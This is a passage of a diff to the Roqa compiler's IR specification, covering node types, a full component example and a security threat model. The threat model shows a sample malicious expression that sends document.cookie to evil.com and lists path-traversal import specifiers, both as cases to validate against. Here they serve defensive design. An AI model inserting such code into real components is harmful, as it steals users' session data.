-    fallback?: NodeIR[];          // Optional view tree when falsy
+  kind: "show";
+  condition: CellRef; // Cell to subscribe to
+  render: NodeIR[]; // View tree when truthy
+  fallback?: NodeIR[]; // Optional view tree when falsy
 };
 ```
 
@@ -1089,28 +1039,28 @@ different surface syntaxes (TSRX-style template `if`, a future Roqa DSL with
 
 ```ts
 type SwitchIR = {
-    kind: "switch";
+  kind: "switch";
 
-    // Optional discriminant. When present, each arm's `test` is compared
-    // against this value with `===` (JavaScript `switch` semantics).
-    // When absent, each arm's `test` is evaluated as a boolean predicate
-    // (if/else if chain semantics).
-    discriminant?: ExprIR;
+  // Optional discriminant. When present, each arm's `test` is compared
+  // against this value with `===` (JavaScript `switch` semantics).
+  // When absent, each arm's `test` is evaluated as a boolean predicate
+  // (if/else if chain semantics).
+  discriminant?: ExprIR;
 
-    arms: SwitchArmIR[];          // Evaluated in order; first match wins
-    fallback?: NodeIR[];          // Default branch (`else` / `default:`)
+  arms: SwitchArmIR[]; // Evaluated in order; first match wins
+  fallback?: NodeIR[]; // Default branch (`else` / `default:`)
 
-    // Optional explicit dependency list. When the compiler can't statically
-    // derive the cells driving this switch (e.g. predicate arms over local
-    // expressions), frontends may declare them here. The compiler also
-    // performs auto-dependency extraction by walking arm tests.
-    deps?: CellRef[];
+  // Optional explicit dependency list. When the compiler can't statically
+  // derive the cells driving this switch (e.g. predicate arms over local
+  // expressions), frontends may declare them here. The compiler also
+  // performs auto-dependency extraction by walking arm tests.
+  deps?: CellRef[];
 };
 
 type SwitchArmIR = {
-    test: ExprIR;                 // Equality test (with discriminant)
-                                  //   or boolean predicate (without)
-    render: NodeIR[];
+  test: ExprIR; // Equality test (with discriminant)
+  //   or boolean predicate (without)
+  render: NodeIR[];
 };
 ```
 
@@ -1122,28 +1072,34 @@ for the runtime semantics.
 
 ```json
 {
-    "kind": "switch",
-    "arms": [
-        {
-            "test": {
-                "kind": "binary",
-                "op": "===",
-                "left": { "kind": "state-read", "name": "status" },
-                "right": { "kind": "literal", "value": "loading" }
-            },
-            "render": [/* loading branch */]
-        },
-        {
-            "test": {
-                "kind": "binary",
-                "op": "===",
-                "left": { "kind": "state-read", "name": "status" },
-                "right": { "kind": "literal", "value": "error" }
-            },
-            "render": [/* error branch */]
-        }
-    ],
-    "fallback": [/* default branch */]
+  "kind": "switch",
+  "arms": [
+    {
+      "test": {
+        "kind": "binary",
+        "op": "===",
+        "left": { "kind": "state-read", "name": "status" },
+        "right": { "kind": "literal", "value": "loading" }
+      },
+      "render": [
+        /* loading branch */
+      ]
+    },
+    {
+      "test": {
+        "kind": "binary",
+        "op": "===",
+        "left": { "kind": "state-read", "name": "status" },
+        "right": { "kind": "literal", "value": "error" }
+      },
+      "render": [
+        /* error branch */
+      ]
+    }
+  ],
+  "fallback": [
+    /* default branch */
+  ]
 }
 ```
 
@@ -1151,14 +1107,31 @@ for the runtime semantics.
 
 ```json
 {
-    "kind": "switch",
-    "discriminant": { "kind": "state-read", "name": "status" },
-    "arms": [
-        { "test": { "kind": "literal", "value": "loading" }, "render": [/* ... */] },
-        { "test": { "kind": "literal", "value": "error" },   "render": [/* ... */] },
-        { "test": { "kind": "literal", "value": "success" }, "render": [/* ... */] }
-    ],
-    "fallback": [/* default */]
+  "kind": "switch",
+  "discriminant": { "kind": "state-read", "name": "status" },
+  "arms": [
+    {
+      "test": { "kind": "literal", "value": "loading" },
+      "render": [
+        /* ... */
+      ]
+    },
+    {
+      "test": { "kind": "literal", "value": "error" },
+      "render": [
+        /* ... */
+      ]
+    },
+    {
+      "test": { "kind": "literal", "value": "success" },
+      "render": [
+        /* ... */
+      ]
+    }
+  ],
+  "fallback": [
+    /* default */
+  ]
 }
 ```
 
@@ -1170,7 +1143,7 @@ maps to most cleanly; the runtime supports both with one helper.
 
 **Fall-through is not supported.** First-match-wins is the only semantics —
 a JS `switch` with fall-through must be normalized into duplicated arms (or
-a different `arms[]` test expression) before reaching the MIR.
+a different `arms[]` test expression) before reaching the IR.
 
 #### When to emit `SwitchIR` vs nested `ShowIR`
 
@@ -1187,16 +1160,16 @@ three subscriptions).
 
 ```ts
 type EachIR = {
-    kind: "each";
-    source: EachSourceIR;         // Cell or arbitrary expression (auto-lifted)
-    key?: string | null;          // Key field name or null for identity
-    itemAlias: string;            // Variable name for the current item (e.g., "todo")
-    indexAlias?: string;          // Optional name bound to the iteration index.
-                                  //   When set, the render body may use a
-                                  //   `local-read` with this name to read 0-based index.
-    render: NodeIR[];             // View tree for each item
-    empty?: NodeIR[];             // Optional view tree rendered when source is empty.
-                                  //   Toggled in/out at the same anchor as the items.
+  kind: "each";
+  source: EachSourceIR; // Cell or arbitrary expression (auto-lifted)
+  key?: string | null; // Key field name or null for identity
+  itemAlias: string; // Variable name for the current item (e.g., "todo")
+  indexAlias?: string; // Optional name bound to the iteration index.
+  //   When set, the render body may use a
+  //   `local-read` with this name to read 0-based index.
+  render: NodeIR[]; // View tree for each item
+  empty?: NodeIR[]; // Optional view tree rendered when source is empty.
+  //   Toggled in/out at the same anchor as the items.
 };
 
 // `each` accepts either a cell-ref or any ExprIR. Non-cell sources (constant
@@ -1228,13 +1201,13 @@ shares the same anchor as the items, so they always render in source order.
 
 ```ts
 type RawHtmlIR = {
-    kind: "raw-html";
-    source: ExprIR;               // Expression resolving to a string of HTML markup
-    trusted?: boolean;            // Frontend declaration acknowledging the
-                                  //   security implications. The default is
-                                  //   `false`. Has no codegen effect today —
-                                  //   reserved for a future runtime
-                                  //   sanitization pass.
+  kind: "raw-html";
+  source: ExprIR; // Expression resolving to a string of HTML markup
+  trusted?: boolean; // Frontend declaration acknowledging the
+  //   security implications. The default is
+  //   `false`. Has no codegen effect today —
+  //   reserved for a future runtime
+  //   sanitization pass.
 };
 ```
 
@@ -1269,17 +1242,17 @@ making the distinction explicit at the IR level prevents accidental XSS via
 
 ```json
 {
-    "kind": "element",
-    "tag": "article",
-    "attributes": {},
-    "events": [],
-    "children": [
-        {
-            "kind": "raw-html",
-            "source": { "kind": "state-read", "name": "markup" },
-            "trusted": true
-        }
-    ]
+  "kind": "element",
+  "tag": "article",
+  "attributes": {},
+  "events": [],
+  "children": [
+    {
+      "kind": "raw-html",
+      "source": { "kind": "state-read", "name": "markup" },
+      "trusted": true
+    }
+  ]
 }
 ```
 
@@ -1296,14 +1269,14 @@ markup.ref_1 = article_1;
 
 ```ts
 type TryIR = {
-    kind: "try";
-    render: NodeIR[];             // Primary content
-    catch?: {
-        errorAlias: string;       // Name bound to the caught error inside `render`.
-                                  //   Read via `local-read` with this name.
-        render: NodeIR[];
-    };
-    pending?: { render: NodeIR[] };  // Suspense-style fallback for async children
+  kind: "try";
+  render: NodeIR[]; // Primary content
+  catch?: {
+    errorAlias: string; // Name bound to the caught error inside `render`.
+    //   Read via `local-read` with this name.
+    render: NodeIR[];
+  };
+  pending?: { render: NodeIR[] }; // Suspense-style fallback for async children
 };
 ```
 
@@ -1320,7 +1293,7 @@ similar to TSRX's `try { } catch { } pending { }` template form.
 
 ---
 
-## MIR: CellRef
+## CellRef
 
 The only remaining ref type. This exists because it expresses a fundamentally
 different operation from reading a value — it means "give me the cell object
@@ -1328,8 +1301,8 @@ itself" for subscription, not "give me the current value."
 
 ```ts
 type CellRef = {
-    kind: "cell-ref";
-    name: string;
+  kind: "cell-ref";
+  name: string;
 };
 ```
 
@@ -1344,7 +1317,7 @@ value (`.v`)."
 
 #### When to emit `cell-ref` vs `state-read`
 
-- **Emit `cell-ref`** when the consumer needs the cell *handle* (so it can
+- **Emit `cell-ref`** when the consumer needs the cell _handle_ (so it can
   subscribe to or write to the cell over time):
   - `ShowIR.condition`
   - `EachIR.source` (when the source is a state cell)
@@ -1363,15 +1336,15 @@ known cell-handle sites above.
 
 ---
 
-## MIR: Event binding IR
+## Event binding IR
 
 ```ts
 type EventBindingIR = {
-    event: string;                // DOM event name: "click", "input", etc.
-    handler: ExprIR;              // Handler expression — typically one of:
-                                  //   ActionCallExpr   → named action reference
-                                  //   ClosureExpr      → inline handler with body
-                                  //   CallExpr         → bound action with args
+  event: string; // DOM event name: "click", "input", etc.
+  handler: ExprIR; // Handler expression — typically one of:
+  //   ActionCallExpr   → named action reference
+  //   ClosureExpr      → inline handler with body
+  //   CallExpr         → bound action with args
 };
 ```
 
@@ -1394,32 +1367,30 @@ Event handlers are `ExprIR` nodes. The most common forms:
 
 ---
 
-## MIR: Class IR
+## Class IR
 
 Classes have their own IR because they support multiple authoring forms that
 normalize to structured data.
 
 ```ts
-type ClassIR =
-    | StaticClassIR
-    | ClassListIR;
+type ClassIR = StaticClassIR | ClassListIR;
 
 type StaticClassIR = {
-    kind: "static-class";
-    value: string;                // e.g., "button primary"
+  kind: "static-class";
+  value: string; // e.g., "button primary"
 };
 
 type ClassListIR = {
-    kind: "class-list";
-    items: ClassItemIR[];
+  kind: "class-list";
+  items: ClassItemIR[];
 };
 
 type ClassItemIR =
-    | string                                          // Static class name
-    | { name: string; condition: ExprIR }             // Conditional class
-    | { kind: "dynamic"; value: ExprIR };             // Arbitrary expression
-                                                      // resolving to a class-name string
-                                                      // (e.g., `class={fn(x)}`)
+  | string // Static class name
+  | { name: string; condition: ExprIR } // Conditional class
+  | { kind: "dynamic"; value: ExprIR }; // Arbitrary expression
+// resolving to a class-name string
+// (e.g., `class={fn(x)}`)
 ```
 
 The three forms compose freely:
@@ -1438,7 +1409,7 @@ The three forms compose freely:
 A `dynamic` item's value is wrapped at runtime so an empty/falsy result
 contributes nothing to the className.
 
-Normalization — all of these source forms produce the same MIR:
+Normalization — all of these source forms produce the same IR:
 
 ```
 // All of these:
@@ -1466,33 +1437,31 @@ class={["todo", { completed: todo.completed }]}
 
 ---
 
-## MIR: Style IR
+## Style IR
 
 Inline styles have their own IR for normalization (camelCase vs kebab-case,
 static vs reactive values).
 
 ```ts
-type StyleIR =
-    | StaticStyleIR
-    | StyleMapIR;
+type StyleIR = StaticStyleIR | StyleMapIR;
 
 type StaticStyleIR = {
-    kind: "static-style";
-    value: string;                // Pre-serialized CSS string (e.g., "color: red; font-size: 14px")
+  kind: "static-style";
+  value: string; // Pre-serialized CSS string (e.g., "color: red; font-size: 14px")
 };
 
 type StyleMapIR = {
-    kind: "style-map";
-    properties: StylePropertyIR[];
+  kind: "style-map";
+  properties: StylePropertyIR[];
 };
 
 type StylePropertyIR = {
-    property: string;             // CSS property name, always kebab-case (e.g., "font-size")
-    value: ExprIR;                // LiteralExpr for static, StateReadExpr etc. for reactive
+  property: string; // CSS property name, always kebab-case (e.g., "font-size")
+  value: ExprIR; // LiteralExpr for static, StateReadExpr etc. for reactive
 };
 ```
 
-All style property names are normalized to kebab-case in the MIR, regardless of
+All style property names are normalized to kebab-case in the IR, regardless of
 how the frontend expressed them (camelCase `fontSize` or kebab-case
 `font-size`). This ensures the code generator only handles one form.
 
@@ -1505,20 +1474,20 @@ how the frontend expressed them (camelCase `fontSize` or kebab-case
 
 Because `setProperty` is used for the dynamic path, kebab-case property names,
 vendor prefixes (`-webkit-...`), and CSS custom properties (`--accent-color`)
-all work uniformly. Frontends should *not* rewrite custom-property names to
+all work uniformly. Frontends should _not_ rewrite custom-property names to
 camelCase.
 
 ---
 
-## MIR: Action IR
+## Action IR
 
 ```ts
 type ActionIR = {
-    kind: "action";
-    name: string;                 // The action name
-    params: string[];             // Parameter names (always simple strings)
-    body: ExprIR;                 // Action logic as a structured expression
-    async?: boolean;              // true if the action was declared `async`
+  kind: "action";
+  name: string; // The action name
+  params: string[]; // Parameter names (always simple strings)
+  body: ExprIR; // Action logic as a structured expression
+  async?: boolean; // true if the action was declared `async`
 };
 ```
 
@@ -1535,16 +1504,16 @@ appropriate reactive update code.
 
 ---
 
-## MIR: Prop, Attr, Emit IR
+## Prop, Attr, Emit IR
 
 ### Props — rich JS values passed to custom elements
 
 ```ts
 type PropIR = {
-    kind: "prop";
-    name: string;
-    required: boolean;
-    default?: unknown;
+  kind: "prop";
+  name: string;
+  required: boolean;
+  default?: unknown;
 };
 ```
 
@@ -1552,10 +1521,10 @@ type PropIR = {
 
 ```ts
 type AttrIR = {
-    kind: "attr";
-    name: string;
-    default?: unknown;
-    reflect: boolean;             // Whether changes are reflected back to the DOM attribute
+  kind: "attr";
+  name: string;
+  default?: unknown;
+  reflect: boolean; // Whether changes are reflected back to the DOM attribute
 };
 ```
 
@@ -1563,9 +1532,9 @@ type AttrIR = {
 
 ```ts
 type EmitIR = {
-    kind: "emit-decl";
-    name: string;                 // Internal handle name (e.g., "todoAdded")
-    eventName: string;            // DOM event name (e.g., "todo-added")
+  kind: "emit-decl";
+  name: string; // Internal handle name (e.g., "todoAdded")
+  eventName: string; // DOM event name (e.g., "todo-added")
 };
 ```
 
@@ -1573,24 +1542,25 @@ type EmitIR = {
 
 ```ts
 type ImportIR = {
-    kind: "import";
-    source: string;               // Module specifier (e.g., "./utils.js")
-    bindings: ImportBinding[];    // What to import from this module
-    sideEffect?: boolean;         // true for bare `import "./styles.css"`
+  kind: "import";
+  source: string; // Module specifier (e.g., "./utils.js")
+  bindings: ImportBinding[]; // What to import from this module
+  sideEffect?: boolean; // true for bare `import "./styles.css"`
 };
 
 // Import bindings can be plain strings (named import where local === imported)
 // or objects describing default / namespace / renamed imports.
 type ImportBinding =
-    | string                      // `import { foo }` — local name
-    | {
-        local: string;            // The local binding name
-        imported?: string;        // For renamed named imports: { foo as bar }
-        kind?: "named" | "default" | "namespace";
-      };
+  | string // `import { foo }` — local name
+  | {
+      local: string; // The local binding name
+      imported?: string; // For renamed named imports: { foo as bar }
+      kind?: "named" | "default" | "namespace";
+    };
 ```
 
 Examples:
+
 - `import { foo } from "x"` → `{ local: "foo", kind: "named" }` (or just `"foo"`)
 - `import { foo as bar } from "x"` → `{ local: "bar", imported: "foo", kind: "named" }`
 - `import foo from "x"` → `{ local: "foo", kind: "default" }`
@@ -1599,16 +1569,16 @@ Examples:
 
 ---
 
-## MIR: Lifecycle IR
+## Lifecycle IR
 
 ```ts
 type LifecycleIR = {
-    onConnect?: ExprIR;           // Runs when the component is mounted
-    onDisconnect?: ExprIR;        // Runs when the component is unmounted
+  onConnect?: ExprIR; // Runs when the component is mounted
+  onDisconnect?: ExprIR; // Runs when the component is unmounted
 };
 ```
 
-**`onConnect` ordering guarantee.** The backend emits `onConnect` *after*:
+**`onConnect` ordering guarantee.** The backend emits `onConnect` _after_:
 
 1. The template has been cloned and appended to `this`.
 2. All DOM traversals have completed (refs to elements are stored).
@@ -1625,90 +1595,96 @@ generator compiles them the same way and places them inside
 
 ---
 
-## MIR: Complete example
+## Complete example
 
-Here is the full MIR for a simple CounterButton component.
+Here is the full Roqa IR for a simple CounterButton component.
 
 ### What the component does
 
 A button that displays a count and a doubled value. Clicking the button
 increments the count.
 
-### MIR
+### Roqa IR
 
 ```json
 {
-    "version": 1,
-    "tagName": "counter-button",
-    "name": "CounterButton",
+  "version": 1,
+  "tagName": "counter-button",
+  "name": "CounterButton",
 
-    "props": [],
-    "attrs": [],
-    "emits": [],
+  "props": [],
+  "attrs": [],
+  "emits": [],
 
-    "state": [
+  "state": [
+    {
+      "kind": "value",
+      "name": "count",
+      "initial": 0
+    },
+    {
+      "kind": "computed",
+      "name": "doubled",
+      "body": {
+        "kind": "binary",
+        "op": "*",
+        "left": { "kind": "state-read", "name": "count" },
+        "right": { "kind": "literal", "value": 2 }
+      }
+    }
+  ],
+
+  "actions": [
+    {
+      "kind": "action",
+      "name": "increment",
+      "params": [],
+      "body": {
+        "kind": "state-write",
+        "name": "count",
+        "value": {
+          "kind": "binary",
+          "op": "+",
+          "left": { "kind": "state-read", "name": "count" },
+          "right": { "kind": "literal", "value": 1 }
+        }
+      }
+    }
+  ],
+
+  "lifecycle": {},
+
+  "render": [
+    {
+      "kind": "element",
+      "tag": "button",
+      "attributes": {
+        "id": { "kind": "literal", "value": "increment-button" }
+      },
+      "events": [
         {
-            "kind": "value",
-            "name": "count",
-            "initial": 0
+          "event": "click",
+          "handler": { "kind": "action-call", "name": "increment", "args": [] }
+        }
+      ],
+      "children": [
+        { "kind": "text", "value": "Count is " },
+        {
+          "kind": "reactive-text",
+          "source": { "kind": "state-read", "name": "count" }
         },
+        { "kind": "text", "value": " / doubled is " },
         {
-            "kind": "computed",
-            "name": "doubled",
-            "body": {
-                "kind": "binary",
-                "op": "*",
-                "left": { "kind": "state-read", "name": "count" },
-                "right": { "kind": "literal", "value": 2 }
-            }
+          "kind": "reactive-text",
+          "source": { "kind": "computed-read", "name": "doubled" }
         }
-    ],
-
-    "actions": [
-        {
-            "kind": "action",
-            "name": "increment",
-            "params": [],
-            "body": {
-                "kind": "state-write",
-                "name": "count",
-                "value": {
-                    "kind": "binary",
-                    "op": "+",
-                    "left": { "kind": "state-read", "name": "count" },
-                    "right": { "kind": "literal", "value": 1 }
-                }
-            }
-        }
-    ],
-
-    "lifecycle": {},
-
-    "render": [
-        {
-            "kind": "element",
-            "tag": "button",
-            "attributes": {
-                "id": { "kind": "literal", "value": "increment-button" }
-            },
-            "events": [
-                {
-                    "event": "click",
-                    "handler": { "kind": "action-call", "name": "increment", "args": [] }
-                }
-            ],
-            "children": [
-                { "kind": "text", "value": "Count is " },
-                { "kind": "reactive-text", "source": { "kind": "state-read", "name": "count" } },
-                { "kind": "text", "value": " / doubled is " },
-                { "kind": "reactive-text", "source": { "kind": "computed-read", "name": "doubled" } }
-            ]
-        }
-    ]
+      ]
+    }
+  ]
 }
 ```
 
-### What the backend does with this MIR
+### What the backend does with this IR
 
 1. **Reads `state`** → emits `const count = cell(0)` and
    `const doubled = cell(() => get(count) * 2)` (computed body compiled from
@@ -1744,24 +1720,25 @@ import { defineComponent, delegate, template } from "roqa";
 const $tmpl_1 = template('<button id="increment-button"> </button>');
 
 defineComponent("counter-button", function CounterButton() {
-    const count = { v: 0, e: [] };
-    const doubled = { v: () => count.v * 2, e: [] };
+  const count = { v: 0, e: [] };
+  const doubled = { v: () => count.v * 2, e: [] };
 
-    this.connected(() => {
-        const $root_1 = $tmpl_1();
-        this.appendChild($root_1);
+  this.connected(() => {
+    const $root_1 = $tmpl_1();
+    this.appendChild($root_1);
 
-        const button_1 = this.firstChild;
-        const button_1_text = button_1.firstChild;
+    const button_1 = this.firstChild;
+    const button_1_text = button_1.firstChild;
 
-        button_1.__click = () => {
-            count.v = count.v + 1;
-            count.ref_1.nodeValue = "Count is " + count.v;
-        };
+    button_1.__click = () => {
+      count.v = count.v + 1;
+      count.ref_1.nodeValue = "Count is " + count.v;
+    };
 
-        button_1_text.nodeValue = "Count is " + count.v + " / doubled is " + count.v * 2;
-        count.ref_1 = button_1_text;
-    });
+    button_1_text.nodeValue =
+      "Count is " + count.v + " / doubled is " + count.v * 2;
+    count.ref_1 = button_1_text;
+  });
 });
 
 delegate(["click"]);
@@ -1771,17 +1748,17 @@ delegate(["click"]);
 
 ## Frontend contract
 
-Any tool that wants to generate Roqa components must produce valid MIR. This
+Any tool that wants to generate Roqa components must produce valid Roqa IR. This
 section specifies that contract.
 
 ### Requirements
 
 1. **Produce a valid `ComponentIR`** — all required fields present, correct
-   types, `version` set to the current MIR version.
+   types, `version` set to the current IR version.
 
-2. **Normalize all sugar** — the MIR must be fully normalized. If your frontend
+2. **Normalize all sugar** — the IR must be fully normalized. If your frontend
    has shorthand syntax (e.g., `class="foo"` vs `class={["foo"]}`), resolve it
-   to the canonical MIR form before emitting.
+   to the canonical IR form before emitting.
 
 3. **Use structured expressions** — action bodies, computed values, and
    lifecycle hooks should use `ExprIR` nodes. Fall back to `OpaqueExpr` only
@@ -1800,14 +1777,14 @@ section specifies that contract.
 
 ### Validation
 
-The backend validates the MIR before code generation. Validation errors mean
+The backend validates the IR before code generation. Validation errors mean
 the frontend produced invalid IR and must be fixed at the frontend level. See
 [compiler.md §Phase 1](./compiler.md#phase-1-validate) for the full list of
 validation checks and their severities.
 
 ### Serialization format
 
-The MIR is serialized as **JSON**. This was chosen for:
+The Roqa IR is serialized as **JSON**. This was chosen for:
 
 - **Debuggability** — you can inspect and hand-edit IR files
 - **Universal support** — every language has a JSON library
@@ -1827,36 +1804,39 @@ src/
 ```
 
 The Vite plugin handles `.roqa` files natively. When Vite encounters an import
-of a `.roqa` file, the plugin reads the JSON, compiles the MIR to optimized
+of a `.roqa` file, the plugin reads the JSON, compiles the IR to optimized
 JavaScript, and serves the result as a JS module. No frontend adapter is needed
 for `.roqa` files — the backend compiler consumes them directly.
 
-The MIR can also be passed as an in-memory JavaScript object (skipping
+The IR can also be passed as an in-memory JavaScript object (skipping
 serialization) when the frontend runs in the same process as the backend
 (e.g., a Vite plugin with a custom `frontend` option).
 
-A JSON Schema for MIR validation will be provided so frontend authors can
+A JSON Schema for IR validation will be provided so frontend authors can
 validate their output independently of the Roqa backend.
 
 ---
 
 ## Component composition
 
-Components compose by rendering child custom elements. In the MIR, a child
+Components compose by rendering child custom elements. In the IR, a child
 component is represented as a regular `ElementIR` node with a custom element
 tag name:
 
 ```json
 {
-    "kind": "element",
-    "tag": "todo-item",
-    "attributes": {
-        "text": { "kind": "state-read", "name": "itemText" }
-    },
-    "events": [
-        { "event": "remove", "handler": { "kind": "action-call", "name": "removeItem", "args": [] } }
-    ],
-    "children": []
+  "kind": "element",
+  "tag": "todo-item",
+  "attributes": {
+    "text": { "kind": "state-read", "name": "itemText" }
+  },
+  "events": [
+    {
+      "event": "remove",
+      "handler": { "kind": "action-call", "name": "removeItem", "args": [] }
+    }
+  ],
+  "children": []
 }
 ```
 
@@ -1865,7 +1845,7 @@ template and traversal level.
 
 ### Attributes on custom elements vs native elements
 
-The MIR does not distinguish between attributes on native HTML elements and
+The IR does not distinguish between attributes on native HTML elements and
 attributes on custom elements — both use `ElementIR.attributes`. The
 **compiler** is responsible for detecting custom element tags (tags containing
 a hyphen) and generating the correct output:
@@ -1876,16 +1856,16 @@ a hyphen) and generating the correct output:
   runtime's `setProp()` mechanism (WeakMap-based), which allows props to be
   set before the child element's `connectedCallback` fires.
 
-This distinction is intentionally a **compiler concern**, not a MIR concern.
-The MIR stays simple — a parent component doesn't need to know how a child
+This distinction is intentionally a **compiler concern**, not an IR concern.
+The IR stays simple — a parent component doesn't need to know how a child
 component declares its props/attrs. The runtime's `getProps()` function
 resolves the mapping at connect time based on how the child's
 `defineComponent()` is configured.
 
 Cross-component type checking (e.g., verifying that a parent passes the right
-props to a child) is **not** part of the MIR or backend. This is a frontend
+props to a child) is **not** part of the IR or backend. This is a frontend
 responsibility — a TypeScript-based frontend can use types, a visual builder
-can use its own schema validation. The MIR intentionally stays out of this to
+can use its own schema validation. The IR intentionally stays out of this to
 avoid coupling frontends to each other.
 
 For files that export multiple components, each component produces its own
@@ -2002,6 +1982,7 @@ The expression IR has no concept of `async`/`await`. For the initial
 implementation this is fine — reactive UI updates should be synchronous. But
 actions that fetch data or perform async operations will eventually need
 either:
+
 - An `AwaitExpr` node in the expression IR
 - A dedicated `AsyncActionIR` variant
 - Relegation to `OpaqueExpr` for now
@@ -2026,6 +2007,7 @@ transformations, and event handling that make components tick. Most of this
 logic is simple: read state, compute something, write state, emit an event.
 
 A lean IR has concrete advantages:
+
 - **Easier to implement and maintain** — fewer node types = smaller compiler
 - **Easier for frontends** — fewer types to produce
 - **Better optimization** — the compiler can deeply understand every node type
@@ -2034,6 +2016,7 @@ A lean IR has concrete advantages:
 ### The case for growing over time
 
 Real-world components will inevitably need:
+
 - `try`/`catch` for error handling
 - `for`/`while` loops for imperative logic
 - Local variable declarations
@@ -2070,10 +2053,11 @@ could produce IR that generates dangerous code.
 ### Threat model
 
 The IR may be produced by:
+
 - A trusted JSX frontend running in the developer's build pipeline
 - A third-party frontend (DSL, GUI builder) that may have bugs
 - A frontend built by an AI agent or other automated tooling
-- A `.roqa-ir.json` file that could have been hand-edited or tampered with
+- A `.roqa` file that could have been hand-edited or tampered with
 
 The backend must produce safe output regardless of the IR source. "Safe" means:
 no XSS, no arbitrary code execution beyond what the component author intended,
@@ -2088,14 +2072,15 @@ the output. A malicious IR could inject arbitrary code:
 
 ```json
 {
-    "kind": "opaque",
-    "source": "fetch('https://evil.com', { method: 'POST', body: document.cookie })",
-    "reads": [],
-    "writes": []
+  "kind": "opaque",
+  "source": "fetch('https://evil.com', { method: 'POST', body: document.cookie })",
+  "reads": [],
+  "writes": []
 }
 ```
 
 **Mitigations:**
+
 - **Validation warning:** Every `OpaqueExpr` triggers an `opaque-expression`
   diagnostic. In a "strict" validation mode, this becomes an error.
 - **Static analysis on source:** The backend can perform lightweight checks
@@ -2113,6 +2098,7 @@ the output. A malicious IR could inject arbitrary code:
 exfiltrate data or perform unintended actions.
 
 **Mitigations:**
+
 - Inline handlers use the structured `ExprIR` — the backend controls what
   code is generated.
 - Event handler bodies are `ExprIR` nodes, not raw source — this limits what
@@ -2126,6 +2112,7 @@ exfiltrate data or perform unintended actions.
 For example, setting `id` or `name` to values that shadow global properties.
 
 **Mitigations:**
+
 - **Validation check:** Warn on `id` values that match global property names
   (`location`, `navigator`, `document`, etc.).
 - **Attribute name blocklist:** Reject or warn on dangerous attribute names
@@ -2141,6 +2128,7 @@ could break out of the template context. For example:
 ```
 
 **Mitigations:**
+
 - **HTML-escape static attribute values** in template generation. The backend
   should always escape `<`, `>`, `"`, `&` in attribute values.
 - **Template strings are build-time only** — they come from the IR, not from
@@ -2152,6 +2140,7 @@ could break out of the template context. For example:
 initial values with `__proto__` properties.
 
 **Mitigations:**
+
 - **Serialize initial values safely** — use `JSON.stringify` / `JSON.parse`
   round-tripping rather than directly embedding object literals in output.
 - **Validation check:** Reject initial values with `__proto__`,
@@ -2163,6 +2152,7 @@ initial values with `__proto__` properties.
 `"../../../etc/passwd"` or `"file:///..."`.
 
 **Mitigations:**
+
 - **Validate import specifiers** — reject absolute paths, `file://` URLs,
   and path traversal patterns (`../` beyond the project root).
 - **Allowlist patterns** — only allow relative paths (`./`, `../` within
@@ -2171,6 +2161,7 @@ initial values with `__proto__` properties.
 ### Security validation mode
 
 The backend should support a `strict` security mode that:
+
 - Promotes all security-related warnings to errors
 - Rejects all `OpaqueExpr` nodes
 - Validates all import paths against an allowlist
@@ -2181,8 +2172,8 @@ source may not be fully trusted.
 
 ```ts
 compile(mir, {
-    security: "strict"  // or "standard" (default)
-})
+  security: "strict", // or "standard" (default)
+});
 ```
 
 ---
@@ -2217,21 +2208,21 @@ it. The shape below is normative for v2.
 
 ```ts
 type StylesheetIR = {
-    kind: "stylesheet";
-    source: string;               // The raw CSS source text authored by the user.
-                                  //   The compiler parses, scopes, and emits it.
-    scope: ScopeMode;             // How the compiler isolates these rules
-                                  //   from the rest of the page.
-    deduplicate?: boolean;        // When true (default), identical stylesheets
-                                  //   across components share an `adoptedStyleSheets`
-                                  //   instance.
+  kind: "stylesheet";
+  source: string; // The raw CSS source text authored by the user.
+  //   The compiler parses, scopes, and emits it.
+  scope: ScopeMode; // How the compiler isolates these rules
+  //   from the rest of the page.
+  deduplicate?: boolean; // When true (default), identical stylesheets
+  //   across components share an `adoptedStyleSheets`
+  //   instance.
 };
 
 type ScopeMode =
-    | { kind: "tag-prefix" }                     // Default — see below.
-    | { kind: "hash"; classes?: string[] }       // Hash-rewrite (Svelte/Vue/TSRX style).
-    | { kind: "global" }                         // No scoping (escape hatch).
-    | { kind: "shadow" };                        // Reserved for future Shadow DOM support.
+  | { kind: "tag-prefix" } // Default — see below.
+  | { kind: "hash"; classes?: string[] } // Hash-rewrite (Svelte/Vue/TSRX style).
+  | { kind: "global" } // No scoping (escape hatch).
+  | { kind: "shadow" }; // Reserved for future Shadow DOM support.
 ```
 
 A component's `ComponentIR` will gain an optional `styles?: StylesheetIR`
@@ -2251,18 +2242,26 @@ custom elements:
 
 ```css
 /* Authored */
-.badge { padding: 0.5rem; }
-.badge.active { background: green; }
+.badge {
+  padding: 0.5rem;
+}
+.badge.active {
+  background: green;
+}
 
 /* Compiled (for tag "user-card") */
-user-card .badge { padding: 0.5rem; }
-user-card .badge.active { background: green; }
+user-card .badge {
+  padding: 0.5rem;
+}
+user-card .badge.active {
+  background: green;
+}
 ```
 
 Pros: zero element rewriting, trivial implementation, predictable output.
 Cons: leaks into descendant components that happen to use the same selectors
 (e.g., a child component that also renders `.badge` will inherit the rule).
-This is the right default for components that don't *need* full isolation —
+This is the right default for components that don't _need_ full isolation —
 which, in practice, is most of them.
 
 **2. Hash-rewrite scoping** (`{ kind: "hash" }`) — opt-in.
@@ -2273,10 +2272,14 @@ matches. This is Svelte/Vue/TSRX-style scoping:
 
 ```css
 /* Authored, compiled with hash "abc123" */
-.badge { padding: 0.5rem; }
+.badge {
+  padding: 0.5rem;
+}
 
 /* Compiled CSS */
-.badge-abc123 { padding: 0.5rem; }
+.badge-abc123 {
+  padding: 0.5rem;
+}
 
 /* Render tree class="badge" attributes become class="badge-abc123" */
 ```
@@ -2307,8 +2310,8 @@ shape will look something like:
 
 ```ts
 type StyleClassRefExpr = {
-    kind: "style-class-ref";
-    name: string;                 // Class name as authored in the parent stylesheet
+  kind: "style-class-ref";
+  name: string; // Class name as authored in the parent stylesheet
 };
 ```
 
@@ -2323,7 +2326,7 @@ A `ScopeMode` union keeps the IR small and lets frontends choose per
 component (or even per stylesheet within a component, eventually).
 
 The IR doesn't model CSS-in-JS, CSS Modules, or utility-class frameworks
-(Tailwind, etc.) — those are higher-level patterns that compile *to* either
+(Tailwind, etc.) — those are higher-level patterns that compile _to_ either
 `StyleIR`, `ClassIR`, or external CSS files. Trying to model them in the IR
 would massively expand the spec with little benefit.
 
@@ -2347,9 +2350,9 @@ Components will use Web APIs — `fetch`, `localStorage`, `URL`, `FormData`,
 
 ```json
 {
-    "kind": "external-ref",
-    "name": "localStorage",
